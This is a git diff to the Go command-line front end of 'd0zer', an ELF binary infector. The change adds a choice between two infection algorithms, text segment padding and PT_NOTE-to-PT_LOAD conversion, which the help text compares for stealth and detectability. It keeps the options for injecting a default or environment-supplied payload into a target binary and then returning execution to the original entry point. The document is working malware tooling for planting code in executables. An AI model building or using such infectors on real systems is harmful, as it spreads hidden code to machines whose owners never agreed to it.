@@ -14,12 +14,6 @@ import (
 	"github.com/d0zer/elfinfect"
 )
 
-func printPayload(p []byte) {
-	fmt.Println("------------------PAYLOAD----------------------------")
-	fmt.Printf("%s", hex.Dump(p))
-	fmt.Println("--------------------END------------------------------")
-}
-
 func getPayloadFromEnv(p io.Writer, key string) (int, error) {
 	val, ok := os.LookupEnv(key)
 	if !ok {
@@ -40,29 +34,42 @@ func getPayloadFromEnv(p io.Writer, key string) (int, error) {
 	return p.Write(decoded)
 }
 
-/*
-	Export :
-	getFileContents
-	WriteDefault
-*/
 func main() {
+	var listAlgos, debug, noPres, noRest, noRetOEP, help bool
+	var pEnv, oFile, pFile, infectionAlgo string
 
-	debug := flag.Bool("debug", false, "see debug output (generated payload, modifications, etc)")
-	pEnv := flag.String("payloadEnv", "", "name of the environmental variable holding the payload")
-	oFile := flag.String("target", "", "path to binary targetted for infection")
-	pFile := flag.String("payloadBin", "", "path to binary containing payload")
-	noPres := flag.Bool("noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
-	noRest := flag.Bool("noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
-	noRetOEP := flag.Bool("noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
+	flag.BoolVar(&help, "help", false, "see this help menu")
+	flag.BoolVar(&debug, "debug", false, "see debug output (generated payload, modifications, etc)")
+	flag.StringVar(&infectionAlgo, "infectionAlgo", "TextSegmentPadding", "specify infection algorithm to use")
+	flag.BoolVar(&listAlgos, "listAlgos", false, "list available infection algorithms")
+	flag.StringVar(&pEnv, "payloadEnv", "", "name of the environmental variable holding the payload")
+	flag.StringVar(&oFile, "target", "", "path to binary targetted for infection")
+	flag.StringVar(&pFile, "payloadBin", "", "path to binary containing payload")
+	flag.BoolVar(&noPres, "noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
+	flag.BoolVar(&noRest, "noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
+	flag.BoolVar(&noRetOEP, "noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
 	flag.Parse()
 
-	if *oFile == "" {
+	switch {
+	case help:
+		flag.PrintDefaults()
+		return
+
+	case listAlgos:
+		fmt.Println("TextSegmentPadding")
+		fmt.Println("\tExtends the text segment and append your payload. There are max payload size considerations. Also more \"stealthy\" than ptnote2ptload.")
+		fmt.Println("PtNoteToPtLoad")
+		fmt.Println("\tConverts the PT_NOTE segment to PT_LOAD. Payloads can be of arbitrary length, more stable than textsegmentpadding but easier to detect")
+		return
+	}
+
+	if oFile == "" {
 		flag.PrintDefaults()
 		log.Fatal("No target binary supplied")
 	}
 	t := new(elfinfect.TargetBin)
 
-	fh, err := os.Open(*oFile)
+	fh, err := os.Open(oFile)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -85,30 +92,30 @@ func main() {
 		return
 	}
 
-	if *noPres == false {
+	if !noPres {
 		t.WritePreservationStub()
 	}
 
 	switch {
 
-	case *pEnv != "" && *pFile != "":
+	case pEnv != "" && pFile != "":
 		flag.PrintDefaults()
 		return
 
-	case *pEnv == "" && *pFile == "":
+	case pEnv == "" && pFile == "":
 		if t.EIdent.Arch == elf.ELFCLASS64 {
 			t.Payload.Write(elfinfect.DefaultPayload64)
 		} else {
 			t.Payload.Write(elfinfect.DefaultPayload32)
 		}
 
-	case *pEnv != "":
-		if _, err := getPayloadFromEnv(&t.Payload, *pEnv); err != nil {
+	case pEnv != "":
+		if _, err := getPayloadFromEnv(&t.Payload, pEnv); err != nil {
 			fmt.Println(err)
 			return
 		}
 
-	case *pFile != "":
+	case pFile != "":
 		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
 		return
 	}
@@ -128,8 +135,17 @@ func main() {
 		return
 	}
 
-	if err := t.InfectBinary(*debug, *noRest, *noRetOEP); err != nil {
-		fmt.Println(err)
-		return
+	switch {
+	case infectionAlgo == "TextSegmentPadding":
+		if err := t.TextSegmentPaddingInfection(debug, noRest, noRetOEP); err != nil {
+			fmt.Println(err)
+			return
+		}
+
+	case infectionAlgo == "PtNoteToPtLoad":
+		if err := t.PtNoteToPtLoadInfection(debug, noRest, noRetOEP); err != nil {
+			fmt.Println(err)
+			return
+		}
 	}
 }
